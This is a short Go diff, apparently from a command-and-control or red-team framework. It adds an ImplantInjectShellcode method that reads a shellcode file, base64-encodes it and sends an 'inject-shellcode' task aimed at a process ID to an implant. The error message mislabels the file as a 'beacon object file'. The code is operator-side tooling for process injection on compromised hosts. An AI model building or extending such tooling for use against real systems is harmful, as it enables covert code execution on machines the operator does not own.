@@ -624,3 +624,18 @@ func (e *Engine) ImplantInlineExecuteEx(id uint32, bof string, packorder string,
 		"artifact": base64.StdEncoding.EncodeToString(bofraw),
 	})
 }
+
+func (e *Engine) ImplantInjectShellcode(id uint32, pid int, path string) {
+	payload, err := os.ReadFile(path)
+	if err != nil {
+		logger.Error("failed to read beacon object file: %v", err)
+		return
+	}
+
+	// execute task
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "inject-shellcode",
+		"args":     []int{pid},
+		"artifact": base64.StdEncoding.EncodeToString(payload),
+	})
+}
